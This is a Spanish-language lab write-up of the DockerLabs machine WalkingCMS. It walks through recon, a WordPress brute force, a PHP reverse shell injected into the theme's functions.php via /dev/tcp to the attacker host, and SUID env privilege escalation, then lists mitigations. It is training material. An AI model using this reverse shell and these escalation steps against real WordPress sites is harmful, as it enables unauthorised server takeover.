# Writeup: WalkingCMS

- **Máquina:** WalkingCMS (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/87/descargar
- **Dificultad:** Fácil
- **Fecha:** 5 de Noviembre 2026

---

## Objetivo
Acceder al panel interno de Wordpress, obtener acceso al servidor interno y privilegios `root`.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh walkingcms.tar
```
<img width="576" height="360" alt="01 DESPLIEGE DOCKERLABS" src="https://github.com/user-attachments/assets/5dc8e57e-4865-4b7c-8d95-40a4fb19a4ab" />


Para comprobar que el servicio se encuentre activo se usó `ping`:

```bash
$ ping 172.17.0.2
```
Resultado:
```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.308 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.075 ms
2 packets transmitted, 2 received, 0% packet loss, time 1030ms
```

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando un único puerto abierto y un aviso sobre la página predeterminada de Apache:

```bash
$ nmap -p- -sCV 172.17.0.2 -o scanwalkingCMS.txt
```

```bash
PORT   STATE SERVICE
80/tcp open  http    PHP cli server 5.5 or later
|_http-title: Apache2 Debian Default Page: It works
```

--- 

## 2. Identificación de vulnerabilidades
Se utilizó `gobuster` para enumeración web.

```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt 
```

Resultado: 

```bash
Progress: 0 / 1 (0.00%)
2026/11/04 12:39:32 the server returns a status code that matches the provided options for non existing urls. http://172.17.0.2/d00b32a8-9c8b-46a5-a51f-1560eb317c56 => 200
 (Length: 10701). Please exclude the response length or the status code or set the wildcard option.. To continue please exclude the status code or the length
```                                                                                                                                                                       

Para evitar este error, se utilizó el parámetro `--exclude-length` y se volvió a lanzar `gobuster` obteniendo como resultado el directorio **/wordpress/**.

```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt --exclude-length 10701
```

<img width="652" height="275" alt="Captura de pantalla (315)" src="https://github.com/user-attachments/assets/a6c79fc1-a0b9-461a-9e5c-01411f2bf6e8" />

Nos dirigimos a **http://172.17.0.2/wordpress/** en el navegador donde se encontró una web vulnerable con Wordpress:

<img width="993" height="460" alt="Captura de pantalla (316)" src="https://github.com/user-attachments/assets/7aeaba87-6db2-4b1b-8187-79e6b2b76e7a" />

Se realizó una segunda búsqueda, esta vez utilizando el diccionario **small.txt**. Como resultado se obtuvo la dirección **http://172.17.0.2/wordpress/wp-login.php**, donde se encuentra una página de login.

```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/small.txt
```

<img width="481" height="463" alt="Captura de pantalla (317)" src="https://github.com/user-attachments/assets/76f9f80c-88b5-4401-ae0c-2606544a5198" />




---
## 3. Explotación
### 3.1. Enumeración de usuarios
Se usó `wpscan` para identificar usuarios, obteniendo como resultado un solo usuario válido: **mario**.

```bash
$ wpscan --url http://172.17.0.2/wordpress/ -e u
```

<img width="1350" height="122" alt="Captura de pantalla (318)" src="https://github.com/user-attachments/assets/784c901c-3706-4b62-8083-ab841a4f720c" />


En la misma salida también se encontró la ruta **/wordpres//xmlrpc.php** que, al visitarla, muestra el siguiente mensaje:

```bash
XML-RPC server accepts POST requests only.
```

> xmlrcp.php permite la comunicación remota de un sitio web, automatiza acciones y permite validar credenciales de forma masiva, por lo que es vulnerable a ataques de fuerza bruta.





### 3.2. Ataque de fuerza bruta a usuario 
`wpscan` tambíen puede utilizarse para ataques de fuerza bruta a usuarios de webs que utilizan Wordpress.

```bash
$ wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
```

```bash
[!] Valid Combinations Found:
 | Username: mario, Password: love
```

<img width="1338" height="110" alt="Captura de pantalla (319)" src="https://github.com/user-attachments/assets/75bc02b5-d0ea-489a-b793-624157b8a6e3" />

Sabiendo la contraseña de **mario**, se inició sesión en en la ruta **/wordpress/wp-login.php** y se accedió al panel de administración de Wordpress.

<img width="1357" height="468" alt="Captura de pantalla (320)" src="https://github.com/user-attachments/assets/639eeccf-9077-46d0-9e95-9c494ec2c11f" />



### 3.3. Reverse shell

Dentro de la pestaña **Apariencia > Theme Code Editor** se encuentran archivos `.php` modificables. 

<img width="1363" height="476" alt="Captura de pantalla (326)" src="https://github.com/user-attachments/assets/4e7e0aa7-e8a5-47b8-9927-a3b6c401f2a0" />


Esto permite cargar instrucciones para crear una reverse shell mediante el siguiente código, que se introdujo en el archivo **functions.php**:

```bash
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
 ?>
```

<img width="1230" height="419" alt="Captura de pantalla (327)" src="https://github.com/user-attachments/assets/71194073-5375-49f2-a332-e67ca87f0566" />

Se dejó a `netcat` escuchando en el puerto **433** antes de guardar los cambios.

```bash
$ nc -lnvp 443
listening on [any] 443 ...
```

Para ejecutar la reverse shell se utilizó `curl` para llamar al archivo modificado y así obtener acceso remoto.


```bash
curl -s http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/functions.php
```

<img width="660" height="187" alt="Captura de pantalla (329)" src="https://github.com/user-attachments/assets/95ad45f5-16de-4d05-8e97-1f92f8d7f9fe" />


### 3.4. Escalada de privilegios
Al ejecutar `sudo -l` aparece el siguiente mensaje: `line 1: sudo: command not found`.
Siendo que no existe sudo, se optó por buscar archivos con permisos **SUID**.

```bash
find / -perm -4000 2>/dev/null
```

<img width="351" height="187" alt="Captura de pantalla (330)" src="https://github.com/user-attachments/assets/6dc70416-fa12-403b-896c-c3037c099284" />

Se utilizó `/bin/env` para la escalada de privilegios. 

```bash
env /bin/sh -p
```

```bash
whoami
root
```

---
## Acciones de mitigación
- **Código malicioso en editor de temas**: deshabilitar el editor de códigos de temas (puede hacerce a traves de `wp-config.php`), aplicar autenticación de usuarios.
- **Usuarios expuestos y contraseñas débiles**: utilizar plugins de seguridad, implementar políticas de contraseñas robustas y MFA.
- **Comprobación de credenciales de forma másiva**: desactivar `xmlrpc.php`.
- **Escalada de privilegios mediante SUID en `/bin/env`**: eliminar SUID de archivos si no es indispensable, aplicar principio de mínimo privilegio.
---
